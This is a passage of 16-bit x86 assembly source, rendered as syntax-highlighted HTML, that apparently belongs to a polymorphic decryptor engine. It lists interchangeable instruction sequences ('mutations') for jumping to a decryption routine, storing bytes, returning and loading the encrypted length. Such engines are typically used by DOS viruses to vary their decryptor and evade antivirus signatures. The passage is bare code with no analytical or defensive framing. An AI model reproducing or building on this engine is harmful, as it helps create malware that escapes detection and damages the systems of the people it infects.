</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc6">clc</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">


</span><span class="sc1">;2/ JMP 12Bh in 5 bytes</span><span class="sc0">

</span><span class="sc5">_mutation2</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">          </span><span class="sc1">;nop</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">    </span><span class="sc1">;xor ax, ax</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">74h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Bh</span><span class="sc0">     </span><span class="sc1">;je decrypte</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C9h</span><span class="sc0">    </span><span class="sc1">;xor cx, cx</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">41h</span><span class="sc0">          </span><span class="sc1">;inc cx</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Bh</span><span class="sc0">     </span><span class="sc1">;jne decrypte</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">          </span><span class="sc1">;nop</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">    </span><span class="sc1">;jmp decrypte</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">          </span><span class="sc1">;nop</span><span class="sc0">
</span><span class="sc6">clc</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">          </span><span class="sc1">;nop</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">34h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">    </span><span class="sc1">;xor al, 0FFh</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Bh</span><span class="sc0">     </span><span class="sc1">;jne decrypte</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">32h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DBh</span><span class="sc0">    </span><span class="sc1">;xor bl, bl</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">76h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc0">     </span><span class="sc1">;jbe decrypte</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">          </span><span class="sc1">;nop</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;mov cx, 2</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Bh</span><span class="sc0">    </span><span class="sc1">;loop decrypte</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">41h</span><span class="sc0">          </span><span class="sc1">;inc cx</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">41h</span><span class="sc0">          </span><span class="sc1">;inc cx</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc0">    </span><span class="sc1">;loop decrypte</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">          </span><span class="sc1">;nop</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;jmp near decrypte</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">          </span><span class="sc1">;nop</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">          </span><span class="sc1">;nop</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;jmp near decrypte</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc4">,</span><span class="sc2">0C5h</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc0"> </span><span class="sc1">;test ch, 1</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">74h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Bh</span><span class="sc0">     </span><span class="sc1">;jz decrypte</span><span class="sc0">

</span><span class="sc1">;3/ STOSB in 6 bytes (without di, si, cx, dl)</span><span class="sc0">

</span><span class="sc5">_mutation3</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">clc</span><span class="sc0">

</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc1">;3</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

</span><span class="sc1">;4/ RET in 5 bytes (without di, si, cx, dl)</span><span class="sc0">

</span><span class="sc5">_mutation4</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">clc</span><span class="sc0">

</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">pushf</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">pushf</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc1">;5/ mov cx, fin_cryptage-debut_cryptage  in 6 bytes</span><span class="sc0">

</span><span class="sc5">_mutation5</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fin_cryptage</span><span class="sc4">-</span><span class="sc5">debut_cryptage</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fin_cryptage</span><span class="sc4">-</span><span class="sc5">debut_cryptage</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fin_cryptage</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">debut_cryptage</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fin_cryptage</span><span class="sc4">-</span><span class="sc5">debut_cryptage</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fin_cryptage</span><span class="sc4">-</span><span class="sc5">debut_cryptage</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fin_cryptage</span><span class="sc4">-</span><span class="sc5">debut_cryptage</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

